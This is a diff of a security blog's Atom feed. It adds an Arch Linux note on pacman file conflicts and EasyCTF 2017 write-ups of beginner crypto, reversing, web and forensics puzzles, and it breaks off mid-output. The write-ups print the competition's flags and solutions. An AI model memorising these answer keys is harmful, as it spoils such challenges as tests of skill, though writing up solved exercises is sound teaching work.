@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://rawsec.ml/"/>
-  <updated>2017-03-06T16:25:20.461Z</updated>
+  <updated>2017-03-21T23:03:54.744Z</updated>
   <id>https://rawsec.ml/</id>
   
   <author>
@@ -14,6 +14,368 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>ArchLinux - Pacman error: $filename exists in filesystem</title>
+    <link href="https://rawsec.ml/en/archlinux-pacman-error-filename-exists-in-filesystem/"/>
+    <id>https://rawsec.ml/en/archlinux-pacman-error-filename-exists-in-filesystem/</id>
+    <published>2017-03-20T23:00:00.000Z</published>
+    <updated>2017-03-21T23:03:54.744Z</updated>
+    
+    <content type="html"><![CDATA[<p>Before each update, check <a href="https://www.archlinux.org/news/" target="_blank" rel="external">Archlinux news</a>, there may be special instructions.</p>
+<p>When updating you system with <code># pacman -Syu</code> you may sometimes encounter this error:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">error: could not prepare transaction</div><div class="line">error: failed to commit transaction (conflicting files)</div><div class="line">libname: /absolut/file/path exists in filesystem</div><div class="line">Errors occurred, no packages were upgraded.</div></pre></td></tr></table></figure></p>
+<p><code>pacman</code> has detected a file conflict, and is preventing you to overwrite those files. So it's user responsability to take a decision.</p>
+<p>To solve this you have to check that those files are not used by any installed package with the command: <code>$ pacman -Qo /absolut/file/path</code>.</p>
+<p>If no package is using the file you will get this normal error:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ pacman -Qo /absolut/file/path</div><div class="line">error: No package owns /absolut/file/path</div></pre></td></tr></table></figure></p>
+<p>Now you can rename the file (<code>mv /path/file.ext /path/file.ext.bck</code>), then try the update again <code># pacman -Syu</code> and then remove the, now, useless file (<code>rm /path/file.ext.bck</code>).</p>
+<p>But if the file is used <a href="https://wiki.archlinux.org/index.php/Reporting_bug_guidelines" target="_blank" rel="external">report a bug</a>.</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Before each update, check &lt;a href=&quot;https://www.archlinux.org/news/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Archlinux news&lt;/a&gt;, there may be speci
+    
+    </summary>
+    
+      <category term="linux" scheme="https://rawsec.ml/categories/linux/"/>
+    
+      <category term="archlinux" scheme="https://rawsec.ml/categories/linux/archlinux/"/>
+    
+    
+      <category term="linux" scheme="https://rawsec.ml/tags/linux/"/>
+    
+      <category term="archlinux" scheme="https://rawsec.ml/tags/archlinux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>EasyCTF 2017 - Write-ups</title>
+    <link href="https://rawsec.ml/en/EasyCTF-2017-write-ups/"/>
+    <id>https://rawsec.ml/en/EasyCTF-2017-write-ups/</id>
+    <published>2017-03-20T23:00:00.000Z</published>
+    <updated>2017-03-21T22:26:02.646Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
+<h3 id="version">Version</h3>
+<table>
+<thead>
+<tr>
+<th>By</th>
+<th>Version</th>
+<th>Comment</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>noraj</td>
+<td>1.0</td>
+<td>Creation</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ctf">CTF</h3>
+<ul>
+<li><strong>Name</strong> : EasyCTF 2017</li>
+<li><strong>Website</strong> : <a href="https://www.easyctf.com/" target="_blank" rel="external">easyctf.com</a></li>
+<li><strong>Type</strong> : Online</li>
+<li><strong>Format</strong> : Jeopardy</li>
+<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/441" target="_blank" rel="external">link</a></li>
+</ul>
+<h2 id="5-irc-miscellaneous">5 - IRC - Miscellaneous</h2>
+<blockquote>
+<p>EasyCTF has an IRC channel! Check out <code>#easyctf2017</code> on freenode to claim a free flag, and stick around to get on-the-fly updates during the competition.</p>
+</blockquote>
+<p>Flag: <code>easyctf{irc_d0esn7_apist0rm_:)}</code></p>
+<h2 id="10-hello-world-programming">10 - Hello, world! - Programming</h2>
+<blockquote>
+<p>Use your favorite programming language to print <code>Hello, world!</code> to stdout! Use the programming interface to do this!</p>
+<p>Programming Judge codes:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&gt; AC: accepted</div><div class="line">&gt; WA: WRONG ANSWER (you&apos;re bad)</div><div class="line">&gt; TLE: time limit exceeded (make your code faster)</div><div class="line">&gt; RTE: runtime error</div><div class="line">&gt; JE: judge error (contact an admin if you encounter this)</div><div class="line">&gt; CE: compilation error</div><div class="line">&gt;</div></pre></td></tr></table></figure></p>
+</blockquote>
+<p>Python3 code:</p>
+<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python3</span></div><div class="line">print(<span class="string">"Hello, world!"</span>)</div></pre></td></tr></table></figure></p>
+<h2 id="15-things-add-up-programming">15 - Things Add Up - Programming</h2>
+<blockquote>
+<p>For this problem you will utilise the programming interface, which you can access via the navigation bar at the top of your screen.</p>
+<p>The input for your program will be given via STDIN - that's <code>cin</code>, <code>input()</code>, and <code>System.in</code> for cxx, Python, and Java respectively. Output goes to STDOUT - <code>cout</code>, <code>print</code>, and <code>System.out</code>. Your program will be run on several sets of input, and if your output matches ours for each testcase, this problem will be marked solved.</p>
+<p>We'll start with a simple challenge. Each testcase has two lines of input. The first will contain an integer <code>N</code>. The second will contain a sequence of integers <code>a_1, a_2, ..., a_N</code>. You are to output the sum of that sequence - that is, <code>a_1 + a_2 + ... + a_n</code>. Good luck!</p>
+<h4 id="input-constraints">Input Constraints</h4>
+<p><code>0 &lt; N &lt; 100</code></p>
+<p><code>-1000 &lt; a_i &lt; 1000</code></p>
+<h4 id="sample-input">Sample Input</h4>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt; 5</div><div class="line">&gt; 2 4 7 3 1</div><div class="line">&gt;</div></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<h2 id="sample-output">Sample Output</h2>
+<p><code>17</code></p>
+</blockquote>
+<p>Python3 code:</p>
+<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># total</span></div><div class="line">tot = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="comment"># N</span></div><div class="line">N = int(input())</div><div class="line"></div><div class="line"><span class="comment"># sequence</span></div><div class="line">a_ = input().split(<span class="string">' '</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a_:</div><div class="line">    tot += int(i)</div><div class="line"></div><div class="line">print(tot)</div></pre></td></tr></table></figure></p>
+<h2 id="20-flip-my-letters-cryptography">20 - Flip My Letters - Cryptography</h2>
+<blockquote>
+<p>I dropped my alphabet on its head, can you help me reassemble it? <code>easyctf{r_wlmg_vevm_mvvw_zm_zhxrr_gzyov}</code></p>
+</blockquote>
+<p>Hint:</p>
+<blockquote>
+<p>What happens if you turn the alphabet upside down?</p>
+</blockquote>
+<p>It is some <em>Backward Alphabet Code</em>. I used <a href="https://www.theproblemsite.com/reference/mathematics/codes/backwards-alphabet-code" target="_blank" rel="external">theproblemsite.com</a> to solve this: <code>easyctf{i_dont_even_need_an_ascii_table}</code>.</p>
+<h2 id="20-clear-and-concise-commentary-on-caesar-cipher-cryptography">20 - Clear and Concise Commentary on Caesar Cipher - Cryptography</h2>
+<blockquote>
+<p>I tried to hide a flag sneakily, can you find it? <a href="https://www.easyctf.com/static/0f2b8968db2219e13d4e40125baede48a6ee77af_hexable" target="_blank" rel="external">Download</a></p>
+</blockquote>
+<p>It's easy to find a bunch of ciphertext:</p>
+<ul>
+<li><code>omz kag odmow ftue oubtqd</code></li>
+<li><code>h fns sghr qhfgs sghr shld</code></li>
+<li><code>WKLV LV QRW WKH IODJ</code></li>
+<li><code>xaywqoa fqheqo eo ykkh hega pdwp</code></li>
+<li><code>ldnv bdzrzq hr dzrx</code></li>
+<li><code>RNFLPGS{LBHTBGVG}</code></li>
+<li><code>omt vbvdi</code></li>
+<li><code>gmbbbbbbbbbbbbh</code></li>
+</ul>
+<p>Just crack the ceasar code (with some ruby):</p>
+<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># from https://gist.github.com/matugm/db363c7131e6af27716c</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">caesar_cipher</span><span class="params">(string, shift = <span class="number">1</span>)</span></span></div><div class="line">    alphabet   = Array(<span class="string">'a'</span>..<span class="string">'z'</span>)</div><div class="line">    encrypter  = Hash[alphabet.zip(alphabet.rotate(shift))]</div><div class="line">    <span class="comment"># " " =&gt; c because I don't want to void non-letters chars</span></div><div class="line">    string.chars.map &#123; <span class="params">|c|</span> encrypter.fetch(c, c) &#125;</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">ciphertext = <span class="string">'RNFLPGS&#123;LBHTBGVG&#125;'</span>.downcase</div><div class="line"></div><div class="line">(<span class="number">1</span>...<span class="number">26</span>).each <span class="keyword">do</span> <span class="params">|n|</span></div><div class="line">    puts caesar_cipher(ciphertext, n).join</div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
+<p>Output:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">sogmqht&#123;mciuchwh&#125;</div><div class="line">tphnriu&#123;ndjvdixi&#125;</div><div class="line">uqiosjv&#123;oekwejyj&#125;</div><div class="line">vrjptkw&#123;pflxfkzk&#125;</div><div class="line">wskqulx&#123;qgmyglal&#125;</div><div class="line">xtlrvmy&#123;rhnzhmbm&#125;</div><div class="line">yumswnz&#123;sioaincn&#125;</div><div class="line">zvntxoa&#123;tjpbjodo&#125;</div><div class="line">awouypb&#123;ukqckpep&#125;</div><div class="line">bxpvzqc&#123;vlrdlqfq&#125;</div><div class="line">cyqward&#123;wmsemrgr&#125;</div><div class="line">dzrxbse&#123;xntfnshs&#125;</div><div class="line">easyctf&#123;yougotit&#125;</div><div class="line">fbtzdug&#123;zpvhpuju&#125;</div><div class="line">gcuaevh&#123;aqwiqvkv&#125;</div><div class="line">hdvbfwi&#123;brxjrwlw&#125;</div><div class="line">iewcgxj&#123;csyksxmx&#125;</div><div class="line">jfxdhyk&#123;dtzltyny&#125;</div><div class="line">kgyeizl&#123;euamuzoz&#125;</div><div class="line">lhzfjam&#123;fvbnvapa&#125;</div><div class="line">miagkbn&#123;gwcowbqb&#125;</div><div class="line">njbhlco&#123;hxdpxcrc&#125;</div><div class="line">okcimdp&#123;iyeqydsd&#125;</div><div class="line">pldjneq&#123;jzfrzete&#125;</div><div class="line">qmekofr&#123;kagsafuf&#125;</div></pre></td></tr></table></figure></p>
+<p>So flag is <code>easyctf{yougotit}</code>.</p>
+<h2 id="25-hexable-reverse-engineering">25 - Hexable - Reverse Engineering</h2>
+<blockquote>
+<p>I tried to hide a flag sneakily, can you find it? <a href="https://www.easyctf.com/static/0f2b8968db2219e13d4e40125baede48a6ee77af_hexable" target="_blank" rel="external">Download</a></p>
+</blockquote>
+<p>Easy:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ strings hexable</div><div class="line">Can you find the flag?</div><div class="line">easyctf&#123;g3lZd5MgTYPBJz&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="30-phunky-python-i-reverse-engineering">30 - Phunky Python I - Reverse Engineering</h2>
+<blockquote>
+<p>The other day we happened upon a dusty old laptop covered in duct tape and surrounded by several papers with notes scrawled all over them. Upon inspection, we found that the laptop contained several python files labeled <code>phunky</code>.</p>
+<p>We've determined that each of the files contains a mini reversing challenge. The first task is simple: Find the value of x such that the program prints out <code>easyctf</code> (make sure it's lowercase!).</p>
+<p><a href="https://www.easyctf.com/static/c4d0110ccfce8b2d59f4914a7f7e703765c3738c_phunky1.py" target="_blank" rel="external">phunky1.py</a></p>
+</blockquote>
+<p>Python code to reverse is:</p>
+<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">x = <span class="number">0</span> <span class="comment"># REDACTED</span></div><div class="line">digs = [<span class="number">7074241208379116738</span>, <span class="number">7074241208379116734</span>, <span class="number">7074241208379116752</span>, <span class="number">7074241208379116758</span>, <span class="number">7074241208379116736</span>, <span class="number">7074241208379116753</span>, <span class="number">7074241208379116739</span>]</div><div class="line">out = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> letter <span class="keyword">in</span> reversed(digs):</div><div class="line">    out = chr(letter - x) + out</div><div class="line"><span class="keyword">print</span> out</div></pre></td></tr></table></figure></p>
+<p>In decimal <code>e</code> equal <code>101</code> (ASCII). We know the first letter is <code>e</code> (first letter of <code>easyctf</code>) so to find x we have to calculate <code>7074241208379116738 - 101</code>.</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">irb(main):001:0&gt; 7074241208379116738 - 101</div><div class="line">=&gt; 7074241208379116637</div></pre></td></tr></table></figure></p>
+<p>So the flag is <code>easyctf{7074241208379116637}</code>.</p>
+<h2 id="30-cookie-blog-web">30 - Cookie Blog - Web</h2>
+<blockquote>
+<p>I found the cookie monster's <a href="http://cookieblog.web.easyctf.com/" target="_blank" rel="external">blog!</a></p>
+</blockquote>
+<p>Let's see cookies in the http headers:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$ curl --head http://cookieblog.web.easyctf.com/</div><div class="line">HTTP/1.1 200 OK</div><div class="line">Date: Thu, 16 Mar 2017 22:08:18 GMT</div><div class="line">Content-Type: text/html</div><div class="line">Connection: keep-alive</div><div class="line">Set-Cookie: __cfduid=d32c1739063bfca06d37c0c40cf61298f1489702098; expires=Fri, 16-Mar-18 22:08:18 GMT; path=/; domain=.easyctf.com; HttpOnly</div><div class="line">X-Powered-By: PHP/5.5.9-1ubuntu4.14</div><div class="line">Set-Cookie: flag=easyctf%7Byum_c00kies%21%21%21%7D</div><div class="line">Server: cloudflare-nginx</div><div class="line">CF-RAY: 340b07c1f3201509-CDG</div></pre></td></tr></table></figure></p>
+<p>The server tell us to use this cookie: <code>flag=easyctf%7Byum_c00kies%21%21%21%7D</code>. Let's URLdecode it: <code>flag=easyctf{yum_c00kies!!!}</code>.</p>
+<h2 id="50-mane-event-forensics">50 - Mane Event - Forensics</h2>
+<blockquote>
+<p>My friend just got back from the plains and he took <a href="https://www.easyctf.com/static/588785dd3d2d4e8366c4b0802da7f2425fd7e3fe_lion.jpg" target="_blank" rel="external">this</a> picture with his new camera. He also told me there's a flag hidden in it - can you check it out for me?</p>
+</blockquote>
+<p>We can easyly solve it with <code>strings</code> or <code>exiftool</code>:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ strings 588785dd3d2d4e8366c4b0802da7f2425fd7e3fe_lion.jpg | grep -i easyctf</div><div class="line">@12 - Photo Contests,easyctf&#123;pride_in_african_engin33ring&#125;,2011 B</div><div class="line"></div><div class="line">$ exiftool 588785dd3d2d4e8366c4b0802da7f2425fd7e3fe_lion.jpg | grep -i easyctf</div><div class="line">Keywords                        : 12 - Photo Contests,easyctf&#123;pride_in_african_engin33ring&#125;,2011 B</div></pre></td></tr></table></figure></p>
+<h2 id="50-fizz-buzz-1-programming">50 - Fizz Buzz 1 - Programming</h2>
+<blockquote>
+<p>Write a program that takes an integer <code>n</code> as input.</p>
+<p>Output the numbers 1 through <code>n</code>, in increasing order, one per line.</p>
+<p>However, replace any line that is a multiple of 3 with <code>Fizz</code> and any that are a multiple of 5 with <code>Buzz</code>. Any line that is a multiple of 3 and 5 should be written as <code>FizzBuzz</code>.</p>
+<p>The input will be the number of lines to write, n, followed by a linebreak.</p>
+<p>Sample input:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; 17</div><div class="line">&gt;</div></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>Sample output:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&gt; 1</div><div class="line">&gt; 2</div><div class="line">&gt; Fizz</div><div class="line">&gt; 4</div><div class="line">&gt; Buzz</div><div class="line">&gt; Fizz</div><div class="line">&gt; 7</div><div class="line">&gt; 8</div><div class="line">&gt; Fizz</div><div class="line">&gt; Buzz</div><div class="line">&gt; 11</div><div class="line">&gt; Fizz</div><div class="line">&gt; 13</div><div class="line">&gt; 14</div><div class="line">&gt; FizzBuzz</div><div class="line">&gt; 16</div><div class="line">&gt; 17</div><div class="line">&gt;</div></pre></td></tr></table></figure></p>
+</blockquote>
+<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python3</span></div><div class="line"><span class="comment"># strip newline and cast to int</span></div><div class="line">n = int(input().rstrip())</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, n+<span class="number">1</span>):</div><div class="line">    <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">0</span> <span class="keyword">and</span> i % <span class="number">5</span> == <span class="number">0</span>:</div><div class="line">        print(<span class="string">'FizzBuzz'</span>)</div><div class="line">    <span class="keyword">elif</span> i % <span class="number">3</span> == <span class="number">0</span>:</div><div class="line">        print(<span class="string">'Fizz'</span>)</div><div class="line">    <span class="keyword">elif</span> i % <span class="number">5</span> == <span class="number">0</span>:</div><div class="line">        print(<span class="string">'Buzz'</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        print(i)</div></pre></td></tr></table></figure></p>
+<h2 id="50-rsa-1-cryptography">50 - RSA 1 - Cryptography</h2>
+<blockquote>
+<p>I found somebody's notes on their private RSA! Help me crack <a href="https://www.easyctf.com/static/66d84423fe976a19761216f5a8b9d036125903be_ciphertext1.txt" target="_blank" rel="external">this</a>.</p>
+</blockquote>
+<p><a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)" target="_blank" rel="external">Here</a> is how RSA works.</p>
+<p>We have <code>p</code> and <code>q</code> so we can calculate <code>n</code> and <code>d</code> to get <code>m</code>, and then convert <code>m</code> from integer (numeric) to ASCII:</p>
+<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python2</span></div><div class="line"></div><div class="line"><span class="comment"># credit : http://jhafranco.com/2012/01/29/rsa-implementation-in-python/</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">int2Text</span><span class="params">(number, size)</span>:</span></div><div class="line">    text = <span class="string">""</span>.join([chr((number &gt;&gt; j) &amp; <span class="number">0xff</span>)</div><div class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> reversed(range(<span class="number">0</span>, size &lt;&lt; <span class="number">3</span>, <span class="number">8</span>))])</div><div class="line">    <span class="keyword">return</span> text.lstrip(<span class="string">"\x00"</span>)</div><div class="line"></div><div class="line"><span class="comment"># credit : http://stackoverflow.com/questions/4798654/modular-multiplicative-inverse-function-in-python</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></div><div class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</div><div class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        g, y, x = egcd(b % a, a)</div><div class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></div><div class="line">    g, x, y = egcd(a, m)</div><div class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</div><div class="line">        <span class="keyword">raise</span> Exception(<span class="string">'modular inverse does not exist'</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> x % m</div><div class="line"></div><div class="line">p = <span class="number">35885212171111995346302466488176876500816040695661602379955175537461355378690177</span></div><div class="line">q = <span class="number">33082048174033265491869743773326801992276462089543967631444525716583833833612769</span></div><div class="line">e = <span class="number">65537</span></div><div class="line">c = <span class="number">769108774360724583422343365602954767977840874127335163429133026925857210310609352349335631128387073031906212125470248375564260399006500790258805385203332728116</span></div><div class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</div><div class="line">d = modinv(e, phi)</div><div class="line">n = p*q</div><div class="line"></div><div class="line">m_int = pow(c,d,n)</div><div class="line"></div><div class="line"><span class="keyword">print</span> int2Text(m_int, len(str(m_int)))</div></pre></td></tr></table></figure></p>
+<p>Flag is <code>easyctf{wh3n_y0u_h4ve_p&amp;q_RSA_iz_ez_a45031e1}</code>.</p>
+<h2 id="50-useless-python-reverse-engineering">50 - Useless Python - Reverse Engineering</h2>
+<blockquote>
+<p>Boredom took over, so I wrote this python file! I didn't want anyone to see it though because it doesn't actually run, so I used the coolest base-16 encoding to keep it secret. <a href="https://www.easyctf.com/static/42552c587e13c09d2873cf20c4a2a558f60a3a46_useless.py" target="_blank" rel="external">python</a></p>
+</blockquote>
+<p>The python sample looks like this:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">657865632863687228313031292b63687228313230292b6 [ ... ] 92b6368722836872283532292b636872283439292b636872283431292b6368722834312929</div></pre></td></tr></table></figure></p>
+<p>Base16 is only hexadecimal so just convert it to text:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">exec(chr(101)+chr(120)+chr(101)+chr(99)+chr(40)+ [...] +chr(40)+chr(52)+chr(49)+chr(41)+chr(41))</div></pre></td></tr></table></figure></p>
+<p>Ok, so I made a little ruby script to decode all chars and get the message, but it's like in Inception, the message is an <code>exec</code> with some <code>chr</code> again. So I adapted my script to do the same process until we get the flag:</p>
+<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/ruby</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">deobfuscate</span><span class="params">(s)</span></span></div><div class="line">    <span class="comment"># split file</span></div><div class="line">    arr_in = s.split(<span class="string">'+'</span>)</div><div class="line">    <span class="comment"># convert int to char</span></div><div class="line">    arr_out = []</div><div class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> arr_in</div><div class="line">        char = <span class="regexp">/.*chr\(([0-9]&#123;1,3&#125;)\).*/</span>.match(c).captures[<span class="number">0</span>].to_i.chr</div><div class="line">        arr_out.push(char)</div><div class="line">    <span class="keyword">end</span></div><div class="line">    out = arr_out.join</div><div class="line">    <span class="keyword">return</span> out</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">open(<span class="string">'test.py'</span>, <span class="string">'r'</span>) <span class="keyword">do</span> <span class="params">|f|</span></div><div class="line">    input = f.read()</div><div class="line">    output = <span class="string">''</span></div><div class="line"></div><div class="line">    i = <span class="number">1</span></div><div class="line">    <span class="keyword">until</span> /easyctf/.match(output) <span class="keyword">do</span></div><div class="line">        puts <span class="string">"=== pass n°<span class="subst">#&#123;i&#125;</span> ==="</span></div><div class="line">        output = deobfuscate(input)</div><div class="line">        puts output + <span class="string">"\n\n"</span></div><div class="line">        input = output</div><div class="line">        i+=<span class="number">1</span></div><div class="line">    <span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
+<p>Output of teh script:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$ ruby solve.rb</div><div class="line">=== pass n°1 ===</div><div class="line">exec(chr(101)+chr(120)+chr(101)+chr(99)+chr(40)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(50)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(56)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(55)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(51)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(51)+chr(50)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(54)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(51)+chr(50)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(51)+chr(57)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(55)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(49)+chr(53)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(50)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(57)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(49)+chr(54)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(50)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(50)+chr(51)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(49)+chr(50)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(50)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(49)+chr(54)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(52)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(49)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(49)